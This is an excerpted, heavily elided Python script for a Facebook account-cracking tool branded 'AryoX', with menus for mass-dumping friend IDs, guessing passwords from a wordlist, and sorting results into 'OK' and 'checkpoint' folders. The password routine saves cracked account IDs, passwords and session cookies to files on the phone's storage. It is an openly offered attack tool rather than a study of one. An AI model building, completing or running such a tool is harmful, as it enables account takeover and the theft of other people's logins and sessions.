...
def banner():
	...
	ban='''     
     ...
     /\   |  __ \ \   / / __ \___  /\ \   / /    •Author AryoX  
    /  \  | |__) \ \_/ / |  | | / /  \ \_/ /       •Premium
   / /\ \ |  _  / \   /| |  | |/ /    \   /       •Aktif 24 agt
  / ____ \| | \ \  | | | |__| / /__    | |          •Versi 1.6
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/ARYO-DATA/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/ARYO-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
		...
		try:vin = os.listdir('/sdcard/ARYO-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/ARYO-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/ARYO-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/ARYO-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/ARYO-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/ARYO-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		ses=requests.Session()
		yz = 0
		print(x+'['+h+'AryoX'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
...
def crack_file():
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ARYO-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/ARYO-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
...
def setting():
	...
	aplik = input(x+'['+p+'AryoX'+x+'] y/t : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	guw = '# DI SARANKAN MENAMPILKAN OPSI CEKPOIN, AGAR AKUN BISA TERSIMPAN DI FOLDER DATA "ARYO-DATA" '
	sol().print(mark(guw, style='bold blue'))
	guw = '# TAMPILKAN AKUN CEKPOIN '
	sol().print(mark(guw, style='bold green'))
	cpres = input(x+'['+p+'AryoX'+x+'] y/t : ')
	if cpres in ['y','Y']:
		princp.append('ya')
	else:
		princp.append('no')
...
# WORDLIST
def passwrd():
	ler = ' SEMUA DATA RESULT AKUN LIVE DAN CEKPOIN AKAN OTOMATIS TERSIMPAN DI DALAM FOLDER "ARYO-DATA" , SEGERA LAKUKAN PEMBUATAN FOLDER JIKA BELUM MEMPUNYAI FOLDER ARYO-DATA'
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/ARYO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/ARYO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'└── {idf} • {pw}\n  └── {kuki}'
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/ARYO-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/ARYO-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/ARYO-DATA/DUMP')
	except:pass
	login()